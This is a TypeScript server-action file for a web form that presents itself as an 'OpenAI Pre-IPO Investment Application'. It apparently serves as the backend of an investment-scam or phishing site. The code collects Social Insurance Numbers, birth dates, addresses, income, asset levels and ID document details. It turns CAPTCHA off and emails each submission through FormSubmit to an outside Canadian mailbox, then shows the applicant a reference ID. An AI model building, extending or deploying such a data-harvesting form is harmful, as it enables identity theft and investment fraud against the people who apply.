'use server';

import { z } from 'zod';

// Define Zod schema for validation (simplified for brevity)
const applicationSchema = z.object({
  // Personal Info
  fullName: z.string().min(2, 'Full name is required'),
  dateOfBirth: z.string().min(1, 'Date of birth is required'), // Consider specific date format validation
  email: z.string().email('Invalid email address'),
  phone: z.string().min(10, 'Valid phone number is required'),
  streetAddress: z.string().min(1, 'Street address is required'),
  city: z.string().min(1, 'City is required'),
  province: z.string().min(1, 'Province is required'),
  postalCode: z.string().min(6, 'Valid postal code is required'),
  sin: z
    .string()
    .regex(
      /^\d{3}-\d{3}-\d{3}$|^\d{9}$/,
      'Valid SIN is required (e.g., 123-456-789 or 123456789)'
    ),

  // Employment & Financial
  employmentStatus: z.string().min(1, 'Employment status is required'),
  occupation: z.string().optional(),
  employerName: z.string().optional(),
  annualIncome: z.string().min(1, 'Annual income range is required'),
  netFinancialAssets: z
    .string()
    .min(1, 'Net financial assets range is required'),
  sourceOfFunds: z.string().min(1, 'Source of funds is required'),

  // Accredited Investor
  accreditedStatus: z
    .array(z.string())
    .min(1, 'Accredited investor status selection is required'),

  // Documents (file names for simulation)
  idFrontName: z.string().optional(),
  idBackName: z.string().optional(),
  proofOfAddressName: z.string().optional(),

  // Consents
  consentDataProcessing: z
    .boolean()
    .refine((val) => val === true, 'Consent is required'),
  consentTerms: z
    .boolean()
    .refine((val) => val === true, 'Agreement to terms is required'),
  informationAccuracy: z
    .boolean()
    .refine((val) => val === true, 'Confirmation of accuracy is required'),
});

export type ApplicationData = z.infer<typeof applicationSchema>;
export type FormState = {
  message: string;
  errors?: Partial<Record<keyof ApplicationData, string[]>>;
  success: boolean;
  submittedData?: ApplicationData;
  submissionId?: string;
};

// FormSubmit API Configuration
const FORMSUBMIT_EMAIL =
  process.env.FORMSUBMIT_EMAIL || 'accounts@cgfinancialcanada.ca';
const FORMSUBMIT_API_KEY = process.env.FORMSUBMIT_API_KEY;

// Helper function to get FormSubmit API key
export async function getFormSubmitApiKey(
  email: string
): Promise<{ success: boolean; message: string; apiKey?: string }> {
  try {
    const response = await fetch(
      `https://formsubmit.co/api/get-apikey/${encodeURIComponent(email)}`,
      {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      }
    );

    const data = await response.json();

    if (data.success) {
      return {
        success: true,
        message:
          'API key request sent to your email. Please check your mailbox and update your environment variables.',
        apiKey: data.apiKey,
      };
    } else {
      return {
        success: false,
        message: data.message || 'Failed to request API key',
      };
    }
  } catch (error) {
    console.error('Error requesting FormSubmit API key:', error);
    return {
      success: false,
      message: 'Failed to request API key. Please try again later.',
    };
  }
}

// Helper function to get form submissions (for admin use)
export async function getFormSubmissions(): Promise<{
  success: boolean;
  submissions?: any[];
  message: string;
}> {
  if (!FORMSUBMIT_API_KEY) {
    return {
      success: false,
      message:
        'API key not configured. Please set FORMSUBMIT_API_KEY environment variable.',
    };
  }

  try {
    const response = await fetch(
      `https://formsubmit.co/api/get-submissions/${FORMSUBMIT_API_KEY}`,
      {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      }
    );

    const data = await response.json();

    if (data.success) {
      return {
        success: true,
        submissions: data.submissions,
        message: 'Submissions retrieved successfully',
      };
    } else {
      return {
        success: false,
        message: data.message || 'Failed to retrieve submissions',
      };
    }
  } catch (error) {
    console.error('Error retrieving FormSubmit submissions:', error);
    return {
      success: false,
      message: 'Failed to retrieve submissions. Please try again later.',
    };
  }
}

// Helper function to format application data for FormSubmit
function formatApplicationForSubmission(data: ApplicationData) {
  const timestamp = new Date().toISOString();

  return {
    // FormSubmit specific fields
    _subject: `OpenAI Pre-IPO Investment Application - ${data.fullName}`,
    _captcha: false,
    _template: 'table',
    _next: `${process.env.NEXT_PUBLIC_APP_URL || 'https://openai-investment.com'}/apply?success=true`,

    // Application timestamp
    application_submitted_at: timestamp,

    // Personal Information
    full_name: data.fullName,
    date_of_birth: data.dateOfBirth,
    email: data.email,
    phone: data.phone,
    street_address: data.streetAddress,
    city: data.city,
    province: data.province,
    postal_code: data.postalCode,
    sin: data.sin,

    // Employment & Financial Information
    employment_status: data.employmentStatus,
    occupation: data.occupation || 'Not provided',
    employer_name: data.employerName || 'Not provided',
    annual_income: data.annualIncome,
    net_financial_assets: data.netFinancialAssets,
    source_of_funds: data.sourceOfFunds,

    // Accredited Investor Status
    accredited_status: data.accreditedStatus.join(', '),

    // Document Information
    id_front_name: data.idFrontName || 'Not uploaded',
    id_back_name: data.idBackName || 'Not uploaded',
    proof_of_address_name: data.proofOfAddressName || 'Not uploaded',

    // Consents (converted to readable format)
    consent_data_processing: data.consentDataProcessing ? 'Yes' : 'No',
    consent_terms: data.consentTerms ? 'Yes' : 'No',
    information_accuracy: data.informationAccuracy ? 'Yes' : 'No',

    // Investment Details
    investment_opportunity: 'OpenAI Pre-IPO Shares',
    application_type: 'Pre-IPO Private Placement',

    // Additional metadata
    user_agent: 'OpenAI Investment Application',
    referrer: 'OpenAI IPO Brochure Website',
  };
}

export async function submitApplication(
  prevState: FormState | null,
  formData: FormData
): Promise<FormState> {
  try {
    // Add slight delay for better UX
    await new Promise((resolve) => setTimeout(resolve, 1000));

    const data = Object.fromEntries(formData.entries());

    // Manual parsing for array fields like accreditedStatus and boolean for checkboxes
    const accreditedStatusRaw = formData.getAll('accreditedStatus');
    const accreditedStatus = Array.isArray(accreditedStatusRaw)
      ? accreditedStatusRaw.map(String)
      : [];

    const processedData = {
      ...data,
      dateOfBirth: data.dateOfBirth as string,
      sin: (data.sin as string).replace(/\s+/g, ''), // Remove spaces from SIN for validation
      accreditedStatus,
      consentDataProcessing: data.consentDataProcessing === 'on',
      consentTerms: data.consentTerms === 'on',
      informationAccuracy: data.informationAccuracy === 'on',
    };

    // Validate the form data using Zod schema
    const validatedFields = applicationSchema.safeParse(processedData);

    if (!validatedFields.success) {
      console.error(
        'Validation Errors:',
        validatedFields.error.flatten().fieldErrors
      );
      return {
        message: 'Please correct the highlighted errors and try again.',
        errors: validatedFields.error.flatten().fieldErrors,
        success: false,
      };
    }

    // Format data for FormSubmit
    const submissionData = formatApplicationForSubmission(validatedFields.data);

    // Submit to FormSubmit
    const formSubmitResponse = await fetch(
      `https://formsubmit.co/${FORMSUBMIT_EMAIL}`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
        body: JSON.stringify(submissionData),
      }
    );

    if (!formSubmitResponse.ok) {
      const errorText = await formSubmitResponse.text();
      console.error('FormSubmit Error:', errorText);

      return {
        message:
          'There was an error submitting your application. Please try again or contact support.',
        success: false,
      };
    }

    const submissionResult = await formSubmitResponse.json();
    console.log('FormSubmit Success:', submissionResult);

    // Generate a submission ID for tracking
    const submissionId =
      `OAI-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`.toUpperCase();

    return {
      message: `Application submitted successfully! Your reference ID is ${submissionId}. We will review your information and contact you within 2-3 business days.`,
      success: true,
      submittedData: validatedFields.data,
      submissionId,
    };
  } catch (error) {
    console.error('Submission Error:', error);

    return {
      message:
        'An unexpected error occurred. Please try again later or contact our support team at accounts@cgfinancialcanada.ca',
      success: false,
    };
  }
}

// Helper function to validate and test FormSubmit connection
export async function testFormSubmitConnection(): Promise<{
  success: boolean;
  message: string;
}> {
  try {
    const testData = {
      _subject: 'FormSubmit Connection Test - OpenAI Investment Portal',
      _captcha: false,
      name: 'Test Connection',
      email: 'test@example.com',
      message:
        'This is a connection test for the OpenAI investment application form.',
      timestamp: new Date().toISOString(),
      test: true,
    };

    const response = await fetch(`https://formsubmit.co/${FORMSUBMIT_EMAIL}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      body: JSON.stringify(testData),
    });

    if (response.ok) {
      return {
        success: true,
        message: 'FormSubmit connection successful',
      };
    } else {
      return {
        success: false,
        message: `FormSubmit connection failed: ${response.status} ${response.statusText}`,
      };
    }
  } catch (error) {
    return {
      success: false,
      message: `FormSubmit connection error: ${error instanceof Error ? error.message : 'Unknown error'}`,
    };
  }
}
